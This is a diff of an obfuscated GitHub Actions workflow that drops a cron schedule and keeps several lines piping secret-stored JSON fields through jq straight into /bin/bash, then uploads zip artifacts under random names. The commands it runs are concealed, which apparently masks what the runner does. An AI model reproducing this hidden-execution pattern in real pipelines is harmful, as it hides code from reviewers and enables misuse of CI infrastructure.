@@ -1,8 +1,7 @@
 name: brielleneo4j8501
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '34 4,10,16,22 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,24 +9,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: brielleneo4j8501
         env:
-          o2818: ${{ secrets.o2818 }}
+          o4031: ${{ secrets.o4031 }}
         run: |
-          printf '%s' "$o2818" | jq -r .xce349 | /bin/bash
-          echo $gtj051 | jq -r .uw05565 | /bin/bash
-          echo $cdw62 | jq -r .z20 | /bin/bash
-          printf '%s' "$qer9923" | jq -r .aoyzb8691 | /bin/bash
-          echo $jspyb95 | jq -r .n18799 | /bin/bash
-          echo $qe4 | jq -r .moytn56379 | /bin/bash
-          printf '%s' "$jhwiz455" | jq -r .dtz310 | /bin/bash
-          echo $nfx631 | jq -r .qhf5076 | /bin/bash
-          echo $wvtzh4 | jq -r .evszj708 | /bin/bash
-          echo $ks35 | jq -r .l79 | /bin/bash
-          echo $r43957 | jq -r .yb2134 | /bin/bash
-          echo $ba7841 | jq -r .gub158 | /bin/bash
+          printf '%s' "$o4031" | jq -r .c38 | /bin/bash
+          echo $eved2308 | jq -r .cllm19281 | /bin/bash
+          printf '%s' "$xwb26545" | jq -r .cy67 | /bin/bash
+          echo $ob8643 | jq -r .h463 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: RA8XPMhp
+          name: iQ6nKf2b
           path: "*.zip"
           retention-days: 1
